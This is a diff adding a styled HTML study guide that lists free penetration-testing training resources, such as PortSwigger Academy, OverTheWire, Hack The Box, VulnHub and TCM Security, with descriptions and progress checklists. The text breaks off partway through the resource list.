@@ -1,0 +1,1961 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>REDTEAM.GUIDE // FREE STACK MANUAL</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&family=Orbitron:wght@400;700;900&display=swap');
+
+  :root {
+    --green: #00ff41;
+    --green-dim: #00cc33;
+    --green-faint: #003311;
+    --green-glow: rgba(0,255,65,0.15);
+    --amber: #ffb000;
+    --red: #ff3030;
+    --cyan: #00ffff;
+    --bg: #020a02;
+    --bg2: #060e06;
+    --border: #1a3a1a;
+    /* tracker extras */
+    --green-dark: #003a0d;
+    --blue: #00bfff;
+    --text: #c8f5c8;
+    --muted: #5a8a5a;
+    --surface: #0d1a0d;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--green);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    line-height: 1.6;
+    overflow-x: hidden;
+    cursor: crosshair;
+  }
+
+  /* CRT scanlines overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.18) 2px,
+      rgba(0,0,0,0.18) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* CRT vignette */
+  body::after {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,0.75) 100%);
+    pointer-events: none;
+    z-index: 9998;
+  }
+
+  /* ── HEADER ── */
+  header {
+    border-bottom: 1px solid var(--green-dim);
+    padding: 2rem 3rem 1.5rem;
+    position: relative;
+    overflow: hidden;
+  }
+
+  header::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: linear-gradient(180deg, rgba(0,255,65,0.04) 0%, transparent 100%);
+  }
+
+  .header-top {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 0.5rem;
+  }
+
+  .status-bar {
+    font-size: 11px;
+    color: var(--green-dim);
+    letter-spacing: 2px;
+  }
+
+  .blink { animation: blink 1.2s step-end infinite; }
+  @keyframes blink { 50% { opacity: 0; } }
+
+  h1 {
+    font-family: 'VT323', monospace;
+    font-size: clamp(2.5rem, 6vw, 5rem);
+    color: var(--green);
+    text-shadow: 0 0 20px var(--green), 0 0 40px rgba(0,255,65,0.4);
+    letter-spacing: 4px;
+    line-height: 1;
+    animation: flicker 8s infinite;
+  }
+
+  @keyframes flicker {
+    0%, 95%, 100% { opacity: 1; }
+    96% { opacity: 0.7; }
+    97% { opacity: 1; }
+    98% { opacity: 0.6; }
+    99% { opacity: 1; }
+  }
+
+  .subtitle {
+    font-size: 12px;
+    color: var(--amber);
+    letter-spacing: 6px;
+    text-transform: uppercase;
+    margin-top: 0.4rem;
+    text-shadow: 0 0 10px rgba(255,176,0,0.5);
+  }
+
+  .header-meta {
+    display: flex;
+    gap: 2rem;
+    margin-top: 1.2rem;
+    font-size: 11px;
+    color: var(--green-dim);
+    border-top: 1px solid var(--border);
+    padding-top: 0.8rem;
+  }
+
+  .meta-item span { color: var(--green); }
+
+  /* ── LAYOUT ── */
+  .container {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 2rem 3rem 4rem;
+  }
+
+  /* ── SECTION TITLE ── */
+  .section-label {
+    font-family: 'Orbitron', monospace;
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 4px;
+    color: var(--amber);
+    text-transform: uppercase;
+    margin-bottom: 1.5rem;
+    padding-bottom: 0.5rem;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+  }
+
+  .section-label::before {
+    content: '//';
+    color: var(--green-dim);
+  }
+
+  .section-label::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border), transparent);
+    margin-left: 1rem;
+  }
+
+  /* ── INTRO BLOCK ── */
+  .intro-block {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--green);
+    padding: 1.5rem;
+    margin-bottom: 3rem;
+    position: relative;
+  }
+
+  .intro-block::before {
+    content: '> BRIEFING';
+    position: absolute;
+    top: -9px; left: 12px;
+    background: var(--bg2);
+    padding: 0 8px;
+    font-size: 10px;
+    color: var(--green-dim);
+    letter-spacing: 3px;
+  }
+
+  .intro-block p {
+    color: #88cc88;
+    font-size: 13px;
+    line-height: 1.8;
+  }
+
+  /* ── RESOURCE CARDS ── */
+  .resources-grid {
+    display: grid;
+    gap: 1.5rem;
+    margin-bottom: 3rem;
+  }
+
+  .resource-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 1.5rem;
+    position: relative;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    overflow: hidden;
+  }
+
+  .resource-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 3px; height: 100%;
+    background: var(--card-color, var(--green));
+    box-shadow: 0 0 12px var(--card-color, var(--green));
+  }
+
+  .resource-card:hover {
+    border-color: var(--card-color, var(--green));
+    box-shadow: 0 0 20px rgba(0,255,65,0.08), inset 0 0 30px rgba(0,255,65,0.03);
+  }
+
+  .card-header {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    margin-bottom: 1rem;
+    gap: 1rem;
+  }
+
+  .card-index {
+    font-family: 'VT323', monospace;
+    font-size: 3rem;
+    color: var(--border);
+    line-height: 1;
+    min-width: 50px;
+  }
+
+  .card-title-group { flex: 1; }
+
+  .card-name {
+    font-family: 'Orbitron', monospace;
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--card-color, var(--green));
+    text-shadow: 0 0 10px var(--card-color, var(--green));
+    letter-spacing: 1px;
+    margin-bottom: 0.2rem;
+  }
+
+  .card-role {
+    font-size: 11px;
+    color: var(--amber);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+
+  .card-badge {
+    font-size: 9px;
+    font-family: 'Orbitron', monospace;
+    letter-spacing: 2px;
+    padding: 3px 8px;
+    border: 1px solid;
+    text-transform: uppercase;
+    border-color: var(--card-color, var(--green));
+    color: var(--card-color, var(--green));
+    white-space: nowrap;
+  }
+
+  .card-desc {
+    color: #88cc88;
+    font-size: 12.5px;
+    line-height: 1.7;
+    margin-bottom: 1rem;
+  }
+
+  .card-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+    margin-bottom: 1rem;
+  }
+
+  .tag {
+    font-size: 10px;
+    padding: 2px 8px;
+    background: var(--green-faint);
+    border: 1px solid var(--border);
+    color: var(--green-dim);
+    letter-spacing: 1px;
+  }
+
+  .card-url {
+    font-size: 11px;
+    color: var(--cyan);
+    text-shadow: 0 0 8px rgba(0,255,255,0.3);
+    text-decoration: none;
+    border-bottom: 1px dashed rgba(0,255,255,0.3);
+    transition: text-shadow 0.2s;
+  }
+
+  .card-url:hover { text-shadow: 0 0 16px var(--cyan); }
+
+  /* ── LEARNING PATH ── */
+  .path-section { margin-bottom: 3rem; }
+
+  .path-row {
+    display: flex;
+    align-items: stretch;
+    gap: 0;
+    margin-bottom: 0;
+  }
+
+  .path-connector {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    width: 40px;
+    flex-shrink: 0;
+  }
+
+  .path-node {
+    width: 14px;
+    height: 14px;
+    border: 2px solid var(--green);
+    background: var(--bg);
+    box-shadow: 0 0 8px var(--green);
+    flex-shrink: 0;
+    margin-top: 22px;
+  }
+
+  .path-line {
+    width: 2px;
+    flex: 1;
+    background: linear-gradient(180deg, var(--green-dim), var(--border));
+    min-height: 20px;
+  }
+
+  .path-item {
+    flex: 1;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 1rem 1.2rem;
+    margin-bottom: 4px;
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    transition: border-color 0.2s;
+  }
+
+  .path-item:hover { border-color: var(--green-dim); }
+
+  .path-phase {
+    font-family: 'VT323', monospace;
+    font-size: 2.5rem;
+    color: var(--green-dim);
+    min-width: 40px;
+    line-height: 1;
+  }
+
+  .path-content { flex: 1; }
+
+  .path-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--green);
+    margin-bottom: 0.3rem;
+  }
+
+  .path-detail {
+    font-size: 11px;
+    color: #557755;
+    line-height: 1.5;
+  }
+
+  .path-duration {
+    font-size: 10px;
+    color: var(--amber);
+    letter-spacing: 2px;
+    white-space: nowrap;
+    text-align: right;
+    padding: 3px 8px;
+    border: 1px solid rgba(255,176,0,0.3);
+  }
+
+  /* ── STRENGTHS / WEAKNESSES ── */
+  .two-col {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1.5rem;
+    margin-bottom: 3rem;
+  }
+
+  @media (max-width: 650px) { .two-col { grid-template-columns: 1fr; } }
+
+  .sw-block {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 1.2rem 1.5rem;
+  }
+
+  .sw-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 3px;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  .sw-title.pos { color: var(--green); }
+  .sw-title.neg { color: var(--red); text-shadow: 0 0 10px rgba(255,48,48,0.4); }
+
+  .sw-item {
+    display: flex;
+    gap: 0.7rem;
+    margin-bottom: 0.7rem;
+    font-size: 12px;
+    color: #88cc88;
+    line-height: 1.5;
+  }
+
+  .sw-item .bullet { flex-shrink: 0; }
+  .sw-item.neg-item { color: #cc8888; }
+  .sw-item .bullet.neg { color: var(--red); }
+
+  /* ── SKILLS MATRIX ── */
+  .matrix-section { margin-bottom: 3rem; }
+
+  .skill-row {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    padding: 0.6rem 0;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .skill-name {
+    width: 200px;
+    font-size: 11px;
+    letter-spacing: 1px;
+    color: #88cc88;
+    flex-shrink: 0;
+  }
+
+  .skill-bar {
+    flex: 1;
+    height: 6px;
+    background: var(--green-faint);
+    border: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  .skill-fill {
+    height: 100%;
+    background: var(--fill-color, var(--green));
+    box-shadow: 0 0 8px var(--fill-color, var(--green));
+    animation: fillBar 1.5s ease-out forwards;
+    width: 0;
+  }
+
+  @keyframes fillBar { to { width: var(--target-width, 0%); } }
+
+  .skill-level {
+    font-size: 10px;
+    color: var(--green-dim);
+    width: 60px;
+    text-align: right;
+    letter-spacing: 1px;
+  }
+
+  /* ── TERMINAL FOOTER ── */
+  .terminal-section {
+    background: #000;
+    border: 1px solid var(--green-dim);
+    padding: 1.5rem;
+    margin-bottom: 3rem;
+    font-size: 12px;
+    box-shadow: 0 0 30px rgba(0,255,65,0.1);
+  }
+
+  .terminal-line { margin-bottom: 0.3rem; color: #88cc88; }
+  .terminal-line .prompt { color: var(--green); }
+  .terminal-line .cmd { color: #fff; }
+  .terminal-line .comment { color: #446644; }
+  .terminal-line .output { color: var(--cyan); margin-left: 2rem; }
+  .terminal-line .warn { color: var(--amber); margin-left: 2rem; }
+
+  .cursor-line {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    margin-top: 0.5rem;
+  }
+
+  .cursor-line .cursor {
+    width: 8px;
+    height: 14px;
+    background: var(--green);
+    animation: blink 1s step-end infinite;
+  }
+
+  /* ── MISC ── */
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2.5rem 0;
+    position: relative;
+  }
+
+  .divider::after {
+    content: '◆';
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: var(--bg);
+    padding: 0 1rem;
+    color: var(--border);
+    font-size: 10px;
+  }
+
+  .warning-box {
+    border: 1px solid var(--amber);
+    background: rgba(255,176,0,0.04);
+    padding: 1rem 1.5rem;
+    margin-bottom: 2rem;
+    font-size: 12px;
+    color: var(--amber);
+    position: relative;
+  }
+
+  .warning-box::before {
+    content: '⚠ NOTICE';
+    display: block;
+    font-family: 'Orbitron', monospace;
+    font-size: 9px;
+    letter-spacing: 3px;
+    margin-bottom: 0.5rem;
+    font-weight: 700;
+  }
+
+  .glitch-text { position: relative; display: inline-block; }
+
+  .glitch-text:hover::before,
+  .glitch-text:hover::after {
+    content: attr(data-text);
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%;
+  }
+
+  .glitch-text:hover::before {
+    color: var(--red);
+    animation: glitchA 0.3s infinite;
+  }
+
+  .glitch-text:hover::after {
+    color: var(--cyan);
+    animation: glitchB 0.3s infinite;
+  }
+
+  @keyframes glitchA {
+    0%   { clip-path: inset(40% 0 50% 0); transform: translate(-2px, 0); }
+    33%  { clip-path: inset(10% 0 70% 0); transform: translate(2px, 0); }
+    66%  { clip-path: inset(80% 0 5% 0);  transform: translate(-1px, 0); }
+    100% { clip-path: inset(40% 0 50% 0); transform: translate(2px, 0); }
+  }
+
+  @keyframes glitchB {
+    0%   { clip-path: inset(20% 0 70% 0); transform: translate(2px, 0); }
+    33%  { clip-path: inset(60% 0 10% 0); transform: translate(-2px, 0); }
+    66%  { clip-path: inset(5% 0 80% 0);  transform: translate(1px, 0); }
+    100% { clip-path: inset(20% 0 70% 0); transform: translate(-2px, 0); }
+  }
+
+  .footnote {
+    font-size: 11px;
+    color: #335533;
+    border-top: 1px solid var(--border);
+    padding-top: 1.5rem;
+    text-align: center;
+    letter-spacing: 1px;
+  }
+
+  /* Responsive */
+  @media (max-width: 768px) {
+    .container { padding: 1.5rem; }
+    header { padding: 1.5rem; }
+    .skill-name { width: 140px; font-size: 10px; }
+    .card-header { flex-wrap: wrap; }
+  }
+
+  /* ── PATH ENHANCEMENTS ── */
+  .path-group-label {
+    font-family: 'Orbitron', monospace;
+    font-size: 9px;
+    font-weight: 700;
+    letter-spacing: 4px;
+    padding: 5px 14px;
+    margin: 18px 0 4px 40px;
+    display: inline-block;
+    text-transform: uppercase;
+  }
+  .path-group-label.lvl-foundation { color: var(--green); border: 1px solid rgba(0,255,65,0.3); background: rgba(0,255,65,0.04); }
+  .path-group-label.lvl-core       { color: var(--amber); border: 1px solid rgba(255,176,0,0.3); background: rgba(255,176,0,0.04); }
+  .path-group-label.lvl-advanced   { color: #bf5fff;      border: 1px solid rgba(191,95,255,0.3); background: rgba(191,95,255,0.04); }
+  .path-group-label.lvl-specialist { color: var(--red);   border: 1px solid rgba(255,48,48,0.3); background: rgba(255,48,48,0.04); }
+  .path-node.lvl-core       { border-color: var(--amber); box-shadow: 0 0 8px var(--amber); }
+  .path-node.lvl-advanced   { border-color: #bf5fff;      box-shadow: 0 0 8px #bf5fff; }
+  .path-node.lvl-specialist { border-color: var(--red);   box-shadow: 0 0 8px var(--red); }
+  .path-item.lvl-core       { border-color: rgba(255,176,0,0.2); }
+  .path-item.lvl-advanced   { border-color: rgba(191,95,255,0.2); }
+  .path-item.lvl-specialist { border-color: rgba(255,48,48,0.2); }
+  .path-title.lvl-core       { color: var(--amber); }
+  .path-title.lvl-advanced   { color: #bf5fff; }
+  .path-title.lvl-specialist { color: var(--red); }
+  .path-resources { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 6px; }
+  .path-resource-pill {
+    font-size: 9px; padding: 1px 7px; border-radius: 1px; letter-spacing: 1px;
+    background: rgba(0,255,65,0.06); border: 1px solid rgba(0,255,65,0.2);
+    color: var(--green-dim); white-space: nowrap;
+  }
+  .path-milestone {
+    font-size: 9px; color: var(--cyan); margin-top: 6px;
+    display: flex; align-items: flex-start; gap: 5px; line-height: 1.4;
+  }
+  .path-milestone::before { content: '✓ MILESTONE:'; color: var(--cyan); flex-shrink: 0; }
+
+  /* ═══════════════════════════════════════════════
+     TRACKER COMPONENT (merged from pentest_study_guide)
+     ═══════════════════════════════════════════════ */
+
+  .tracker-wrapper {
+    margin-top: 1.5rem;
+    border-top: 1px solid var(--border);
+    padding-top: 1rem;
+  }
+
+  .tracker-toggle {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    cursor: pointer;
+    padding: 6px 4px;
+    border-radius: 2px;
+    transition: background 0.15s;
+    margin-bottom: 4px;
+    user-select: none;
+  }
+
+  .tracker-toggle:hover { background: rgba(0,255,65,0.04); }
+
+  .tracker-toggle-label {
+    font-family: 'VT323', monospace;
+    font-size: 18px;
+    letter-spacing: 2px;
+    color: var(--green-dim);
+  }
+
+  .tracker-toggle-stat {
+    font-size: 11px;
+    color: var(--muted);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .tracker-toggle-stat .tstat { color: var(--green); }
+
+  .tracker-toggle-arr {
+    font-size: 13px;
+    color: var(--green-dim);
+  }
+
+  .tracker-body { display: none; padding-top: 8px; }
+  .tracker-body.open { display: block; }
+
+  /* overall progress bar */
+  .t-overall-bar {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 10px 14px;
+    margin-bottom: 14px;
+    border-radius: 2px;
+  }
+
+  .t-bar-label {
+    font-size: 11px;
+    color: var(--muted);
+    margin-bottom: 6px;
+    display: flex;
+    justify-content: space-between;
+  }
+
+  .t-bar-label span { color: var(--green); }
+
+  .t-bar-track {
+    height: 8px;
+    background: var(--green-dark);
+    border-radius: 1px;
+    overflow: hidden;
+  }
+
+  .t-bar-fill {
+    height: 100%;
+    background: var(--green);
+    transition: width 0.4s ease;
+    border-radius: 1px;
+  }
+
+  /* phase rows */
+  .t-phase { margin-bottom: 16px; }
+
+  .t-phase-header {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 6px;
+    cursor: pointer;
+    user-select: none;
+    padding: 5px 4px;
+    border-radius: 2px;
+    transition: background 0.15s;
+  }
+
+  .t-phase-header:hover { background: rgba(0,255,65,0.04); }
+
+  .t-phase-icon {
+    font-family: 'VT323', monospace;
+    font-size: 15px;
+    color: var(--amber);
+    min-width: 30px;
+  }
+
+  .t-phase-title {
+    font-family: 'VT323', monospace;
+    font-size: 17px;
+    color: var(--amber);
+    letter-spacing: 1px;
+    flex: 1;
+  }
+
+  .t-phase-mini-bar {
+    flex: 0 0 80px;
+    height: 3px;
+    background: var(--green-dark);
+    border-radius: 1px;
+    overflow: hidden;
+  }
+
+  .t-phase-mini-fill {
+    height: 100%;
+    background: var(--amber);
+    transition: width 0.3s;
+  }
+
+  .t-phase-count { font-size: 10px; color: var(--muted); min-width: 32px; text-align: right; }
+  .t-arr { color: var(--amber); font-size: 12px; min-width: 12px; }
+
+  .t-items {
+    display: none;
+    padding-left: 8px;
+    border-left: 1px solid var(--border);
+  }
+
+  .t-items.open { display: block; }
+
+  .t-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 8px;
+    padding: 7px 5px;
+    cursor: pointer;
+    border-radius: 2px;
+    transition: background 0.15s;
+    border-bottom: 1px solid rgba(26,58,26,0.5);
+  }
+
+  .t-item:last-child { border-bottom: none; }
+  .t-item:hover { background: rgba(0,255,65,0.04); }
+
+  .t-item.done .t-item-text {
+    color: var(--muted);
+    text-decoration: line-through;
+    text-decoration-color: var(--green-dim);
+  }
+
+  .t-item.done .t-links { opacity: 0.5; }
+
+  .t-checkbox {
+    width: 16px;
+    height: 16px;
+    border: 1px solid var(--green-dim);
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 11px;
+    color: var(--green);
+    background: transparent;
+    margin-top: 2px;
+    transition: all 0.15s;
+  }
+
+  .t-checkbox.checked { background: var(--green-dark); border-color: var(--green); }
+
+  .t-item-body { flex: 1; display: flex; flex-direction: column; gap: 5px; min-width: 0; }
+
+  .t-item-label { display: flex; align-items: center; flex-wrap: wrap; gap: 5px; }
+
+  .t-item-text { font-size: 12px; color: var(--text); line-height: 1.4; }
+
+  .t-item-tag { font-size: 9px; padding: 1px 6px; border-radius: 1px; flex-shrink: 0; }
+  .t-tag-critical { background: rgba(255,60,60,0.15); color: var(--red); border: 1px solid rgba(255,60,60,0.3); }
+  .t-tag-core     { background: rgba(0,170,42,0.15);  color: var(--green-dim); border: 1px solid rgba(0,170,42,0.3); }
+
+  .t-links { display: flex; flex-wrap: wrap; gap: 4px; }
+
+  .t-link-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 3px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    color: var(--blue);
+    background: rgba(0,191,255,0.07);
+    border: 1px solid rgba(0,191,255,0.22);
+    padding: 2px 7px;
+    border-radius: 1px;
+    text-decoration: none;
+    transition: all 0.15s;
+    white-space: nowrap;
+  }
+
+  .t-link-btn:hover { background: rgba(0,191,255,0.18); border-color: rgba(0,191,255,0.5); color: #fff; }
+
+  .tracker-reset {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--muted);
+    background: transparent;
+    border: 1px solid var(--border);
+    padding: 2px 8px;
+    cursor: pointer;
+    border-radius: 2px;
+    transition: all 0.2s;
+    margin-top: 8px;
+  }
+
+  .tracker-reset:hover { color: var(--red); border-color: var(--red); }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-top">
+    <div class="status-bar">SYS: ONLINE &nbsp;|&nbsp; NET: CLEAR &nbsp;|&nbsp; MODE: STUDY<span class="blink">_</span></div>
+    <div class="status-bar">[ FREE TIER ] &nbsp;|&nbsp; COST: $0.00</div>
+  </div>
+  <h1 class="glitch-text" data-text="REDTEAM.GUIDE">REDTEAM.GUIDE</h1>
+  <div class="subtitle">// Free Stack Field Manual // Pentesting From Zero //</div>
+  <div class="header-meta">
+    <div class="meta-item">RESOURCES: <span>11</span></div>
+    <div class="meta-item">COST: <span>$0.00</span></div>
+    <div class="meta-item">SKILL LEVEL: <span>BEGINNER → INTERMEDIATE</span></div>
+    <div class="meta-item">FOCUS: <span>WEB · LINUX · EXPLOITATION</span></div>
+  </div>
+</header>
+
+<div class="container">
+
+  <!-- BRIEFING -->
+  <div class="intro-block">
+    <p>
+      This guide maps a battle-tested <strong style="color:var(--green)">100% free</strong> learning stack for breaking into red team / ethical hacking.
+      The path is deliberate: foundations → web exploitation → real machines → Active Directory → post-exploitation → evasion.
+      Eleven resources are mapped to a 10-phase study plan — each phase has a clear milestone before you advance.
+      No paywalls block core progress. Self-discipline and a working VM are your only requirements. Execute in order.
+    </p>
+  </div>
+
+  <!-- RESOURCES -->
+  <div class="section-label">Arsenal // 11 Resources</div>
+
+  <div class="resources-grid">
+
+    <!-- HackerSploit -->
+    <div class="resource-card" style="--card-color: #00ff41;">
+      <div class="card-header">
+        <div class="card-index">01</div>
+        <div class="card-title-group">
+          <div class="card-name">HackerSploit</div>
+          <div class="card-role">Foundation Layer // Structured Bootcamp</div>
+        </div>
+        <div class="card-badge">YouTube · Free</div>
+      </div>
+      <div class="card-desc">
+        The entry point. HackerSploit delivers a bootcamp-style curriculum with clear methodology walkthroughs and live tool demos.
+        Covers Kali Linux setup, Nmap, Metasploit, enumeration workflows, and report writing. Think of it as your <em>structured professor</em>
+        before jumping into the deep end. Watch actively — replicate every command in your own lab.
+      </div>
+      <div class="card-tags">
+        <span class="tag">Kali Linux</span>
+        <span class="tag">Nmap</span>
+        <span class="tag">Metasploit</span>
+        <span class="tag">Methodology</span>
+        <span class="tag">Tool Demos</span>
+        <span class="tag">Recon</span>
+      </div>
+      <a class="card-url" href="https://hackersploit.org" target="_blank">↗ hackersploit.org</a>
+
+      <!-- ── HACKERSPLOIT TRACKER ── -->
+      <div class="tracker-wrapper">
+        <div class="tracker-toggle" onclick="toggleTracker('hs')">
+          <span class="tracker-toggle-label">[ BOOTCAMP CHECKLIST ]</span>
+          <span class="tracker-toggle-stat">
+            <span id="hs-mini-stat" class="tstat">0/35</span>
+            <span id="hs-toggle-arr" class="tracker-toggle-arr">▶</span>
+          </span>
+        </div>
+        <div id="hs-tracker-body" class="tracker-body">
+          <div id="hs-tracker"></div>
+          <button class="tracker-reset" onclick="resetTracker('hs')">[ RESET HS PROGRESS ]</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- PortSwigger -->
+    <div class="resource-card" style="--card-color: #ff6600;">
+      <div class="card-header">
+        <div class="card-index">02</div>
+        <div class="card-title-group">
+          <div class="card-name">PortSwigger Web Security Academy</div>
+          <div class="card-role">Web Exploitation // Interactive Lab Engine</div>
+        </div>
+        <div class="card-badge">Browser · Free</div>
+      </div>
+      <div class="card-desc">
+        The undisputed king of free web pentesting education. Built by the creators of Burp Suite.
+        Covers OWASP Top 10 and deep-dives beyond it — SQLi, XSS, CSRF, SSRF, XXE, IDOR, OAuth flaws,
+        deserialization, and more. Every concept comes with hands-on labs you run in-browser.
+        No setup needed. No excuses. This is your primary weapon for web attack chains.
+      </div>
+      <div class="card-tags">
+        <span class="tag">SQLi</span>
+        <span class="tag">XSS</span>
+        <span class="tag">SSRF</span>
+        <span class="tag">CSRF</span>
+        <span class="tag">OAuth</span>
+        <span class="tag">Burp Suite</span>
+        <span class="tag">XXE</span>
+        <span class="tag">IDOR</span>
+      </div>
+      <a class="card-url" href="https://portswigger.net/web-security" target="_blank">↗ portswigger.net/web-security</a>
+
+      <!-- ── PORTSWIGGER TRACKER ── -->
+      <div class="tracker-wrapper">
+        <div class="tracker-toggle" onclick="toggleTracker('ps')">
+          <span class="tracker-toggle-label">[ ACADEMY CHECKLIST ]</span>
+          <span class="tracker-toggle-stat">
+            <span id="ps-mini-stat" class="tstat">0/25</span>
+            <span id="ps-toggle-arr" class="tracker-toggle-arr">▶</span>
+          </span>
+        </div>
+        <div id="ps-tracker-body" class="tracker-body">
+          <div id="ps-tracker"></div>
+          <button class="tracker-reset" onclick="resetTracker('ps')">[ RESET PS PROGRESS ]</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- OverTheWire -->
+    <div class="resource-card" style="--card-color: #00ffff;">
+      <div class="card-header">
+        <div class="card-index">03</div>
+        <div class="card-title-group">
+          <div class="card-name">OverTheWire — Bandit</div>
+          <div class="card-role">Linux Fundamentals // Gamified SSH Training</div>
+        </div>
+        <div class="card-badge">SSH · Free</div>
+      </div>
+      <div class="card-desc">
+        Start here if your Linux is weak. Bandit forces you to actually use SSH, navigate filesystems,
+        read file permissions, pipe commands, and think like the shell. Each level is a puzzle.
+        Stuck? That's the point. You're building the muscle memory that every real engagement requires.
+        Progress from Bandit to Natas (web) and Leviathan (privilege escalation) once ready.
+      </div>
+      <div class="card-tags">
+        <span class="tag">SSH</span>
+        <span class="tag">File Permissions</span>
+        <span class="tag">Bash</span>
+        <span class="tag">Enumeration</span>
+        <span class="tag">Piping</span>
+        <span class="tag">Privesc Intro</span>
+      </div>
+      <a class="card-url" href="https://overthewire.org/wargames/bandit/" target="_blank">↗ overthewire.org/wargames/bandit</a>
+    </div>
+
+    <!-- Hack The Box -->
+    <div class="resource-card" style="--card-color: #9fff4c;">
+      <div class="card-header">
+        <div class="card-index">04</div>
+        <div class="card-title-group">
+          <div class="card-name">Hack The Box</div>
+          <div class="card-role">Structured Practice // Real-World Flavour</div>
+        </div>
+        <div class="card-badge">Web · Free Tier</div>
+      </div>
+      <div class="card-desc">
+        HTB Academy Tier 0 modules are free and genuinely excellent — structured paths covering
+        penetration testing process, enumeration, and tooling. The free machine pool is limited but
+        Starting Point machines provide a solid guided intro. Use IppSec's YouTube walkthroughs
+        for retired boxes you can't access yet. The platform adds scoring, community, and prestige.
+      </div>
+      <div class="card-tags">
+        <span class="tag">Academy Modules</span>
+        <span class="tag">Starting Point</span>
+        <span class="tag">Enumeration</span>
+        <span class="tag">Foothold</span>
+        <span class="tag">IppSec Walkthroughs</span>
+      </div>
+      <a class="card-url" href="https://hackthebox.com" target="_blank">↗ hackthebox.com</a>
+    </div>
+
+    <!-- VulnHub -->
+    <div class="resource-card" style="--card-color: #ff3030;">
+      <div class="card-header">
+        <div class="card-index">05</div>
+        <div class="card-title-group">
+          <div class="card-name">VulnHub</div>
+          <div class="card-role">Deep Practice // Offline VM Lab</div>
+        </div>
+        <div class="card-badge">Download · 100% Free</div>
+      </div>
+      <div class="card-desc">
+        Pure, unlimited, offline practice. Download vulnerable VMs and run them in VirtualBox or VMware
+        on your own Kali box. No time limits. No Pwnbox restrictions. No subscriptions.
+        The library spans hundreds of machines from trivially easy to brutally complex.
+        Great picks: Mr-Robot, DC-1, Kioptrix series, SickOS, Stapler.
+        Use walkthrough write-ups on HackTricks or Gabb0 if you're stuck over 2 hours.
+      </div>
+      <div class="card-tags">
+        <span class="tag">VirtualBox</span>
+        <span class="tag">VMware</span>
+        <span class="tag">Offline Lab</span>
+        <span class="tag">No Limits</span>
+        <span class="tag">Mr-Robot</span>
+        <span class="tag">Kioptrix</span>
+        <span class="tag">DC-1</span>
+      </div>
+      <a class="card-url" href="https://vulnhub.com" target="_blank">↗ vulnhub.com</a>
+    </div>
+
+    <!-- TCM Security -->
+    <div class="resource-card" style="--card-color: #bf5fff;">
+      <div class="card-header">
+        <div class="card-index">06</div>
+        <div class="card-title-group">
+          <div class="card-name">TCM Security — The Cyber Mentor</div>
+          <div class="card-role">Active Directory Attacks // Full Attack Chain</div>
+        </div>
+        <div class="card-badge">YouTube · Free</div>
+      </div>
+      <div class="card-desc">
+        The definitive free resource for Active Directory exploitation. TCM Security's YouTube channel
+        walks through the full AD attack chain used in real engagements: domain enumeration with
+        BloodHound &amp; PowerView, credential harvesting, Kerberoasting, AS-REP Roasting,
+        pass-the-hash, pass-the-ticket, DCSync, and lateral movement. Every technique is
+        demonstrated in a self-built home lab — replicate every step. No subscription required.
+      </div>
